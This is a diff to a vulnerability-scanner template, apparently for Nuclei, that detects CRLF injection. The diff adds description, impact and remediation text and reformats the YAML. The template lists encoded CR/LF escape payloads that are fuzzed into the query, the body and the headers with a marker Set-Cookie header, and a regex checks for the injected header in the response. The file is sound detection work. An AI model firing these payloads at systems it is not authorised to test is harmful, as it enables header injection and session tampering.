@@ -1,5 +1,4 @@
 id: crlf-injection
-
 info:
   name: CRLF Injection
   author: pdteam
@@ -7,81 +6,129 @@ info:
   metadata:
     max-request: 41
   tags: crlf,dast
+  description: CRLF Injection is a security vulnerability that occurs when user input
+    is improperly sanitized and incorporated into server-generated responses without
+    proper validation. This vulnerability allows an attacker to inject carriage return
+    (CR) and line feed (LF) characters into the application's output, which can be
+    used to break the structure of the response and potentially execute arbitrary
+    code or perform other malicious actions. CRLF Injection vulnerabilities often
+    arise in web applications that generate dynamic content, such as error messages,
+    redirect pages, or other server-generated responses that include user-supplied
+    data. Exploiting this vulnerability can lead to a range of consequences, including
+    cross-site scripting (XSS) attacks, website defacement, session hijacking, and
+    even remote code execution, making it a serious security concern that must be
+    addressed through thorough input validation and sanitization measures.
+  impact: '- Inject malicious code into server-generated responses, leading to cross-site
+    scripting (XSS) attacks.
 
+    - Bypass security controls and perform session hijacking by manipulating the application''s
+    session cookies or other sensitive information.
+
+    - Redirect users to a malicious website, potentially leading to phishing attacks
+    or further exploitation.
+
+    - Modify the structure of server-generated responses to conceal or obfuscate the
+    attacker''s actions, making it more difficult for defenders to detect and respond
+    to the attack.
+
+    - Leverage the CRLF injection vulnerability to execute arbitrary code on the server,
+    gaining full control over the system and potentially leading to a complete compromise.'
+  remediation: 'To address the CRLF Injection vulnerability, it is crucial to implement
+    robust input validation and sanitization measures across the application. This
+    includes carefully inspecting and sanitizing all user-supplied data before incorporating
+    it into server-generated responses.
+
+
+    - Implement input validation: Ensure that all user input is thoroughly validated
+    and sanitized before using it in server-generated responses. This can be achieved
+    by validating the input against a known set of allowed characters or patterns,
+    and by removing or escaping any potentially malicious characters, such as carriage
+    returns (CR) and line feeds (LF).
+
+    - Use a whitelist approach: Instead of relying on a blacklist of known malicious
+    characters, adopt a whitelist approach where you only allow specific, known-safe
+    characters or patterns in the user input.
+
+    - Leverage input sanitization libraries: Utilize well-established input sanitization
+    libraries or frameworks, such as those provided by the programming language or
+    web framework you''re using, to handle user input in a secure manner.
+
+    - Avoid direct string concatenation: Refrain from directly concatenating user
+    input into server-generated responses. Instead, use secure templating or formatting
+    mechanisms that automatically handle the proper sanitization of user-supplied
+    data.
+
+    - Implement thorough testing: Ensure that your application''s input validation
+    and sanitization mechanisms are thoroughly tested, including edge cases and unexpected
+    user input, to validate their effectiveness in mitigating CRLF Injection vulnerabilities.'
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
-          - 'method == "POST"'
-
-    payloads:
-      escape:
-        low:
-          - "%00"
-          - "%0a"
-          - "%0a%20"
-          - "%0d"
-          - "%0d%09"
-          - "%0d%0a"
-          - "%0d%0a%09"
-          - "%0d%0a%20"
-          - "%0d%20"
-          - "%20"
-        medium:
-          - "%20%0a"
-          - "%20%0d"
-          - "%20%0d%0a"
-          - "%23%0a"
-          - "%23%0a%20"
-          - "%23%0d"
-          - "%23%0d%0a"
-          - "%23%oa"
-          - "%25%30"
-          - "%25%30%61"
-          - "%2e%2e%2f%0d%0a"
-          - "%2f%2e%2e%0d%0a"
-          - "%2f..%0d%0a"
-          - "%3f"
-        high:
-          - "%3f%0a"
-          - "%3f%0d"
-          - "%3f%0d%0a"
-          - "%e5%98%8a%e5%98%8d"
-          - "%e5%98%8a%e5%98%8d%0a"
-          - "%e5%98%8a%e5%98%8d%0d"
-          - "%e5%98%8a%e5%98%8d%0d%0a"
-          - "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"
-          - "%u0000"
-          - "%u000a"
-          - "%u000d"
-          - "\r"
-          - "\r%20"
-          - "\r\n"
-          - "\r\n%20"
-          - "\r\n\t"
-          - "\r\t"
-
-    fuzzing:
-      - part: query
-        type: postfix
-        fuzz:
-          - "{{escape}}Set-Cookie:crlfinjection=crlfinjection"
-
-      - part: body
-        type: postfix
-        fuzz:
-          - "{{escape}}Set-Cookie:crlfinjection=crlfinjection"
-
-      - part: header
-        type: postfix
-        fuzz:
-          - "{{escape}}Set-Cookie:crlfinjection=crlfinjection"
-
-    stop-at-first-match: true
-    matchers:
-      - type: regex
-        part: header
-        regex:
-          - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
-# digest: 4a0a004730450221008ccd353c3f0bf996eef2c21aefb04e928a4f97a498e8820914082fd8fe364221022012b563c9b300c5bc73c952975acc9211cd116e8786cdba9d6788e37a474db99b:922c64590222798bb761d5b6d8e72950
+- pre-condition:
+  - type: dsl
+    dsl:
+    - method == "GET"
+    - method == "POST"
+  payloads:
+    escape:
+      low:
+      - '%00'
+      - '%0a'
+      - '%0a%20'
+      - '%0d'
+      - '%0d%09'
+      - '%0d%0a'
+      - '%0d%0a%09'
+      - '%0d%0a%20'
+      - '%0d%20'
+      - '%20'
+      medium:
+      - '%20%0a'
+      - '%20%0d'
+      - '%20%0d%0a'
+      - '%23%0a'
+      - '%23%0a%20'
+      - '%23%0d'
+      - '%23%0d%0a'
+      - '%23%oa'
+      - '%25%30'
+      - '%25%30%61'
+      - '%2e%2e%2f%0d%0a'
+      - '%2f%2e%2e%0d%0a'
+      - '%2f..%0d%0a'
+      - '%3f'
+      high:
+      - '%3f%0a'
+      - '%3f%0d'
+      - '%3f%0d%0a'
+      - '%e5%98%8a%e5%98%8d'
+      - '%e5%98%8a%e5%98%8d%0a'
+      - '%e5%98%8a%e5%98%8d%0d'
+      - '%e5%98%8a%e5%98%8d%0d%0a'
+      - '%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d'
+      - '%u0000'
+      - '%u000a'
+      - '%u000d'
+      - "\r"
+      - "\r%20"
+      - "\r\n"
+      - "\r\n%20"
+      - "\r\n\t"
+      - "\r\t"
+  fuzzing:
+  - part: query
+    type: postfix
+    fuzz:
+    - '{{escape}}Set-Cookie:crlfinjection=crlfinjection'
+  - part: body
+    type: postfix
+    fuzz:
+    - '{{escape}}Set-Cookie:crlfinjection=crlfinjection'
+  - part: header
+    type: postfix
+    fuzz:
+    - '{{escape}}Set-Cookie:crlfinjection=crlfinjection'
+  stop-at-first-match: true
+  matchers:
+  - type: regex
+    part: header
+    regex:
+    - (?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)
